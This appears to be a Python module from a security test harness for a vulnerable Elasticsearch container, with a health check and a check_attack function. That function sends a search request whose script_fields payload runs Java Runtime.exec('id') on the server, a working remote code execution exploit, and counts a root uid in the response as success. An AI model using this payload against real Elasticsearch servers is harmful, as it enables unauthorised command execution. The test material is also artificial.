
import requests

from basic.server_state import ServerState


def hc_single(scene) -> bool:
    success = False
    try:
        http_port = scene.target_container["ports"][0]

        response = requests.get(f"http://localhost:{http_port}")
        # print(response.text)
        if "You Know, for Search" in response.text:
            success = True

    except (StopIteration, requests.RequestException):
        return False

    return success


def get_state(
    container_name: str, http_port: int, db_port: int = -1, save_tag: str = "demo"
) -> ServerState:
    return ServerState([], [])


def check_attack(
    http_port: int, container_id: str, session: requests.Session, db_port: int
) -> bool:
    rsp = session.post(
        url=f"http://localhost:{http_port}/_search?pretty",
        json={
            "size": 1,
            "query": {"filtered": {"query": {"match_all": {}}}},
            "script_fields": {
                "command_output": {
                    "script": f"""import java.io.*;
                new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next();"""
                }
            },
        },
    )
    print(rsp.text)
    return "uid=0(root)" in rsp.text
